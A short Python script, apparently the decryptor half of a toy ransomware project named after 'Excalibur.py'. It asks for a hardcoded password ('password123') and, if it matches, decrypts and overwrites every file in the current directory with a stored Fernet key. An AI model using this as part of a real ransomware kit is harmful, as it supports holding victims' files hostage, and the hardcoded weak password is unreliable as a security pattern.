#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#find some files

files = []
for file in os.listdir():
	if file == "Excalibur.py" or file == "RansomwareKey.key" or file == "Decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print (files)

with open ("RansomwareKey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "password123"

user_phrase = input("Enter password to decrypt\n")

if user_phrase == secretphrase: 
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open (file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print ("Files Unlocked")
else:
	print("Nice try!")


